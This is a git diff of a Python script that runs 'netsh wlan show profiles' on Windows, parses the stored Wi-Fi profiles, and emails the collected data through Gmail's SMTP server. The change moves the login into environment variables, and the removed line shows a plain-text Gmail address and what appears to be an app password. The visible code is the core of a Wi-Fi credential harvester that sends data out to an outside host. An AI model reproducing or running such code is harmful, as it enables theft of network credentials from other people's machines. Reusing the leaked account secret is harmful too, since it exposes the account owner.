@@ -2,6 +2,10 @@ import subprocess
 import re
 import smtplib
 from email.message import EmailMessage
+import os
+
+EMAIL_ADDR = os.environ.get('EMAIL_ADDRESS')
+EMAIL_PSWD = os.environ.get('EMAIL_PASSWORD')
 
 command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, shell=True).stdout.decode()
 profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
@@ -34,5 +38,5 @@ for i in wifi_list:
 
 msg.set_content(content)
 with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
-    s.login('mkpro118@gmail.com', 'ykuiohljrydpindk')
+    s.login(EMAIL_ADDR, EMAIL_PSWD)
     s.send_message(msg)
